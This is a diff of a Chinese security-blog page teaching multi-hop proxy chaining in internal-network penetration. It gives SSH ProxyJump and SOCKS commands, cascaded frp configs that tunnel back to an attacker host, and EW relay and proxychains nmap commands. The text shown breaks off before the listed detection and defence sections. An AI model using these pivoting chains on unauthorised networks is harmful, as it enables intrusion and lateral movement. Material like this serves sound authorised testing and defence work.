@@ -1,98 +1,259 @@
-<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="内网多级代理：SSH ProxyJump 多级、frp 级联、EW(Socks 链)、Proxifier 汇聚，穿透纵深内网的操作步骤与检测防御。"><title>内网多级代理实战（纵深代理链）</title><link rel=canonical href=https://souljian.cn/p/751088108/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="内网多级代理实战（纵深代理链）"><meta property='og:description' content="内网多级代理：SSH ProxyJump 多级、frp 级联、EW(Socks 链)、Proxifier 汇聚，穿透纵深内网的操作步骤与检测防御。"><meta property='og:url' content='https://souljian.cn/p/751088108/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='内网渗透'><meta property='article:tag' content='代理'><meta property='article:tag' content='隧道'><meta property='article:tag' content='SSH隧道'><meta property='article:tag' content='横向移动'><meta property='article:published_time' content='2026-08-30T02:10:00+08:00'><meta property='article:modified_time' content='2026-08-30T02:10:00+08:00'><meta name=twitter:title content="内网多级代理实战（纵深代理链）"><meta name=twitter:description content="内网多级代理：SSH ProxyJump 多级、frp 级联、EW(Socks 链)、Proxifier 汇聚，穿透纵深内网的操作步骤与检测防御。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="内网多级代理实战：SSH ProxyJump 多级串联、frp 级联、EW Socks 链，穿透纵深内网的操作步骤与检测防御。"><title>内网多级代理实战：纵深穿透代理链（SSH ProxyJump / frp 级联 / EW 串联）</title><link rel=canonical href=https://souljian.cn/p/751088108/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="内网多级代理实战：纵深穿透代理链（SSH ProxyJump / frp 级联 / EW 串联）"><meta property='og:description' content="内网多级代理实战：SSH ProxyJump 多级串联、frp 级联、EW Socks 链，穿透纵深内网的操作步骤与检测防御。"><meta property='og:url' content='https://souljian.cn/p/751088108/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='内网渗透'><meta property='article:tag' content='代理'><meta property='article:tag' content='隧道'><meta property='article:tag' content='SSH隧道'><meta property='article:tag' content='frp'><meta property='article:tag' content='横向移动'><meta property='article:tag' content='ProxyJump'><meta property='article:published_time' content='2026-08-30T02:10:00+08:00'><meta property='article:modified_time' content='2026-08-30T08:30:00+08:00'><meta name=twitter:title content="内网多级代理实战：纵深穿透代理链（SSH ProxyJump / frp 级联 / EW 串联）"><meta name=twitter:description content="内网多级代理实战：SSH ProxyJump 多级串联、frp 级联、EW Socks 链，穿透纵深内网的操作步骤与检测防御。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
 <span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_d0e0f681fd935e1f.jpg width=300 height=303 class=site-logo loading=lazy alt=Avatar>
 </a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>SoulJian小站</a></h1><h2 class=site-description>人生所有的痛苦，皆来自于我执</h2></div></header><ol class=menu-social><li><a href=https://github.com/souljian03 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
 <span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
 <span>搜索</span></a></li><li><a href=/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
 <span>友情链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
 <svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
-<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一原理为什么要多级代理>一、原理：为什么要多级代理</a></li><li><a href=#二影响>二、影响</a></li><li><a href=#三使用--复现>三、使用 / 复现</a><ol><li><a href=#1-ssh-多级最轻量>1. SSH 多级（最轻量）</a></li><li><a href=#2-frp-多级级联>2. frp 多级级联</a></li><li><a href=#3-ewearthworm级联>3. EW（EarthWorm）级联</a></li><li><a href=#4-本地汇聚使用>4. 本地汇聚使用</a></li></ol></li><li><a href=#四操作步骤>四、操作步骤</a></li><li><a href=#五检测与防御>五、检测与防御</a></li><li><a href=#六小结>六、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088108/>内网多级代理实战（纵深代理链）</a></h2><h3 class=article-subtitle>内网多级代理：SSH ProxyJump 多级、frp 级联、EW(Socks 链)、Proxifier 汇聚，穿透纵深内网的操作步骤与检测防御。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一原理为什么要多级代理>一、原理：为什么要多级代理</a></li><li><a href=#二多级代理拓扑图>二、多级代理拓扑图</a></li><li><a href=#三影响>三、影响</a></li><li><a href=#四使用--复现>四、使用 / 复现</a><ol><li><a href=#方案1ssh-proxyjump最轻量>方案1：SSH ProxyJump（最轻量）</a></li><li><a href=#方案2frp-多级级联>方案2：frp 多级级联</a></li><li><a href=#方案3ewearthworm串联老方案>方案3：EW（EarthWorm）串联（老方案）</a></li></ol></li><li><a href=#五方案对比>五、方案对比</a></li><li><a href=#六操作步骤>六、操作步骤</a></li><li><a href=#七检测与防御>七、检测与防御</a></li><li><a href=#八小结>八、小结</a></li><li><a href=#延伸阅读>延伸阅读</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088108/>内网多级代理实战：纵深穿透代理链（SSH ProxyJump / frp 级联 / EW 串联）</a></h2><h3 class=article-subtitle>内网多级代理实战：SSH ProxyJump 多级串联、frp 级联、EW Socks 链，穿透纵深内网的操作步骤与检测防御。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
 <time class=article-time--published datetime=2026-08-30T02:10:00+08:00>Aug 30, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>多级代理只用于授权内网。对非授权网络建立代理链可能触犯法律。</p><h2 id=一原理为什么要多级代理>一、原理：为什么要多级代理</h2><p>单级代理只能从“攻击机 → 一台跳板 → 内网”。但深一点的内网往往要<strong>经过多台主机</strong>才能到达目标网段：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>攻击机 → 跳板1 → 跳板2 → 目标网段
-</span></span></code></pre></td></tr></table></div></div><p>多级代理就是把代理“串”起来，让流量逐级穿过，最终能访问纵深网段。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>关键：每一级都要能“继续往外/往里转”，而不是只做一个 socks
-</span></span></code></pre></td></tr></table></div></div><h2 id=二影响>二、影响</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+<time class=article-time--reading>阅读时长: 3 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>多级代理只用于授权内网。对非授权网络建立代理链可能触犯法律。</p><h2 id=一原理为什么要多级代理>一、原理：为什么要多级代理</h2><p>单级代理只能从"攻击机 → 一台跳板 → 内网"。但深一点的内网往往要<strong>经过多台主机</strong>才能到达目标网段：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>攻击机（公网） → 跳板1（DMZ/互联网区） → 跳板2（办公网） → 目标（核心区/域控）
+</span></span></code></pre></td></tr></table></div></div><p>多级代理就是把代理"串"起来，让流量逐级穿过，最终能访问纵深网段。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>关键：每一级都要能&#34;继续往外/往里转&#34;，而不是只做一个 Socks
+</span></span><span class=line><span class=cl>每多一级，延迟和丢包风险增大，稳定性下降
+</span></span></code></pre></td></tr></table></div></div><h2 id=二多级代理拓扑图>二、多级代理拓扑图</h2><img src=/img/multi-proxy-topology.svg alt=内网多级代理拓扑图><h2 id=三影响>三、影响</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>打通纵深内网，横向到核心区
-</span></span><span class=line><span class=cl>数据/隧道稳定回传
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>打通纵深内网，横向到核心区（域控、数据库、财务）
+</span></span><span class=line><span class=cl>数据/隧道稳定回传，支撑持久化 C2
 </span></span><span class=line><span class=cl>是内网渗透推进的关键能力
-</span></span></code></pre></td></tr></table></div></div><h2 id=三使用--复现>三、使用 / 复现</h2><h3 id=1-ssh-多级最轻量>1. SSH 多级（最轻量）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></span></code></pre></td></tr></table></div></div><h2 id=四使用--复现>四、使用 / 复现</h2><h3 id=方案1ssh-proxyjump最轻量>方案1：SSH ProxyJump（最轻量）</h3><p>SSH 的 <code>-J</code>（ProxyJump）支持一条命令穿透多级跳板，无需额外工具：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
 </span><span class=lnt>7
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 直接跳板链：攻击机 → 跳板1 → 跳板2</span>
-</span></span><span class=line><span class=cl>ssh -J user1@跳板1,user2@跳板2 user3@目标IP
-</span></span><span class=line><span class=cl><span class=c1># 解释：-J 指定依次经过的跳板，一条命令直达</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 直接跳板链：攻击机 → 跳板1 → 跳板2 → 目标</span>
+</span></span><span class=line><span class=cl>ssh -J user1@跳板1IP,user2@跳板2IP user3@10.20.0.5
+</span></span><span class=line><span class=cl><span class=c1># 解释：-J 指定依次经过的跳板，一条命令直达目标</span>
 </span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># 在本地起 socks，走整条链</span>
-</span></span><span class=line><span class=cl>ssh -J user1@跳板1,user2@跳板2 -D <span class=m>1080</span> user3@目标IP
-</span></span><span class=line><span class=cl><span class=c1># 解释：-D 1080 建立本地 socks，配合 proxychains 访问目标网段</span>
-</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>~/.ssh/config 里写 ProxyJump，可复用：
-</span></span><span class=line><span class=cl>Host target
+</span></span><span class=line><span class=cl><span class=c1># 建 Socks 代理（走整条链）</span>
+</span></span><span class=line><span class=cl>ssh -J user1@跳板1IP,user2@跳板2IP -D <span class=m>1080</span> user3@10.20.0.5
+</span></span><span class=line><span class=cl><span class=c1># 解释：-D 1080 在攻击机开 socks，配合 proxychains 访问目标网段</span>
+</span></span></code></pre></td></tr></table></div></div><p>更优雅的写法是 <code>~/.ssh/config</code> 复用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Host target
+</span></span><span class=line><span class=cl>  HostName 10.20.0.5
+</span></span><span class=line><span class=cl>  User user3
 </span></span><span class=line><span class=cl>  ProxyJump jump1,jump2
-</span></span><span class=line><span class=cl>  User xxx
-</span></span></code></pre></td></tr></table></div></div><h3 id=2-frp-多级级联>2. frp 多级级联</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>一级：攻击机起 frps，跳板1 跑 frpc（socks）
-</span></span><span class=line><span class=cl>二级：在跳板1 上再起 frps，跳板2 跑 frpc（socks）
-</span></span><span class=line><span class=cl>依次串联，最终在本地汇聚成一条链
-</span></span></code></pre></td></tr></table></div></div><h3 id=3-ewearthworm级联>3. EW（EarthWorm）级联</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span><span class=lnt>4
-</span><span class=lnt>5
-</span><span class=lnt>6
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 跳板1（正向）：开 socks5 监听</span>
-</span></span><span class=line><span class=cl>./ew -s ssocksd -l <span class=m>1080</span>
-</span></span><span class=line><span class=cl><span class=c1># 攻击机（反向汇聚）：-r 本地端口 -l socks 端口</span>
-</span></span><span class=line><span class=cl>./ew -s rcsocks -l <span class=m>1080</span> -e <span class=m>8888</span>
-</span></span><span class=line><span class=cl><span class=c1># 跳板2：把 8888 转给跳板1 的 1080（多级串联）</span>
-</span></span><span class=line><span class=cl>./ew -s lcx_tran -l <span class=m>8888</span> -f 跳板1IP -p <span class=m>1080</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host jump1
+</span></span><span class=line><span class=cl>  HostName 10.0.0.1
+</span></span><span class=line><span class=cl>  User user1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host jump2
+</span></span><span class=line><span class=cl>  HostName 10.10.0.1
+</span></span><span class=line><span class=cl>  User user2
 </span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>解释：一级 socks 传给二级，形成多级代理链
-</span></span><span class=line><span class=cl>（老工具，很多场景已被 frp/ssh 替代，思路仍通用）
-</span></span></code></pre></td></tr></table></div></div><h3 id=4-本地汇聚使用>4. 本地汇聚使用</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 使用后直接命令直达</span>
+</span></span><span class=line><span class=cl>ssh target
+</span></span><span class=line><span class=cl><span class=c1># 或建 socks</span>
+</span></span><span class=line><span class=cl>ssh -D <span class=m>1080</span> target
+</span></span></code></pre></td></tr></table></div></div><p><strong>优缺点</strong>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>优点：零工具、零落地、最轻量、SSH 自带加密
+</span></span><span class=line><span class=cl>缺点：需要每级跳板都有 SSH 凭证；并发多时单 SSH 会话成为瓶颈
+</span></span></code></pre></td></tr></table></div></div><h3 id=方案2frp-多级级联>方案2：frp 多级级联</h3><p>当跳板没有 SSH 权限或需要更复杂隧道时，用 frp 级联：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># proxychains 指向最终 socks 端口，访问深层网段</span>
-</span></span><span class=line><span class=cl>proxychains4 nmap -sT -Pn 10.20.0.0/24
-</span></span><span class=line><span class=cl>proxychains4 rdesktop 10.20.0.5
-</span></span></code></pre></td></tr></table></div></div><h2 id=四操作步骤>四、操作步骤</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>攻击机 frps（7000）
+</span></span><span class=line><span class=cl>  ← frpc1（跳板1，同时跑 frps 7100）
+</span></span><span class=line><span class=cl>    ← frpc2（跳板2，socks5）
+</span></span></code></pre></td></tr></table></div></div><p><strong>配置</strong>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ini data-lang=ini><span class=line><span class=cl><span class=c1># frpc1.ini（跑在跳板1上）</span>
+</span></span><span class=line><span class=cl><span class=k>[common]</span>
+</span></span><span class=line><span class=cl><span class=na>server_addr</span> <span class=o>=</span> <span class=s>攻击机IP</span>
+</span></span><span class=line><span class=cl><span class=na>server_port</span> <span class=o>=</span> <span class=s>7000</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 把跳板1的 7100（frps）暴露到攻击机</span>
+</span></span><span class=line><span class=cl><span class=k>[frps_jump2]</span>
+</span></span><span class=line><span class=cl><span class=na>type</span> <span class=o>=</span> <span class=s>tcp</span>
+</span></span><span class=line><span class=cl><span class=na>local_ip</span> <span class=o>=</span> <span class=s>127.0.0.1</span>
+</span></span><span class=line><span class=cl><span class=na>local_port</span> <span class=o>=</span> <span class=s>7100</span>
+</span></span><span class=line><span class=cl><span class=na>remote_port</span> <span class=o>=</span> <span class=s>7100</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ini data-lang=ini><span class=line><span class=cl><span class=c1># frps1.ini（也跑在跳板1上）</span>
+</span></span><span class=line><span class=cl><span class=k>[common]</span>
+</span></span><span class=line><span class=cl><span class=na>bind_port</span> <span class=o>=</span> <span class=s>7100</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>第 1 步：画内网拓扑，确定需要几级代理
-</span></span><span class=line><span class=cl>第 2 步：每级建立隧道/socks（SSH -J / frp / EW）
-</span></span><span class=line><span class=cl>第 3 步：本地把多级 socks 汇聚（最终一个端口）
-</span></span><span class=line><span class=cl>第 4 步：proxychains 访问目标网段并横向
-</span></span><span class=line><span class=cl>第 5 步：按需加端口转发（RDP/数据库）
-</span></span><span class=line><span class=cl>第 6 步：用后清理代理进程与会话
-</span></span></code></pre></td></tr></table></div></div><h2 id=五检测与防御>五、检测与防御</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ini data-lang=ini><span class=line><span class=cl><span class=c1># frpc2.ini（跑在跳板2上）</span>
+</span></span><span class=line><span class=cl><span class=k>[common]</span>
+</span></span><span class=line><span class=cl><span class=na>server_addr</span> <span class=o>=</span> <span class=s>跳板1内网IP</span>
+</span></span><span class=line><span class=cl><span class=na>server_port</span> <span class=o>=</span> <span class=s>7100</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>[socks5_level2]</span>
+</span></span><span class=line><span class=cl><span class=na>type</span> <span class=o>=</span> <span class=s>tcp</span>
+</span></span><span class=line><span class=cl><span class=na>remote_port</span> <span class=o>=</span> <span class=s>1081</span>
+</span></span><span class=line><span class=cl><span class=na>plugin</span> <span class=o>=</span> <span class=s>socks5</span>
+</span></span></code></pre></td></tr></table></div></div><p><strong>流量路径</strong>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>攻击机 → frps(1081) → frp协议 → frpc1(frps 7100) → frp协议 → frpc2(socks5) → 内网目标
+</span></span></code></pre></td></tr></table></div></div><p><strong>优缺点</strong>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>优点：支持加密、可级联多层、支持端口映射和 Socks 混合
+</span></span><span class=line><span class=cl>缺点：每级都需要 frp 二进制，落地痕迹多
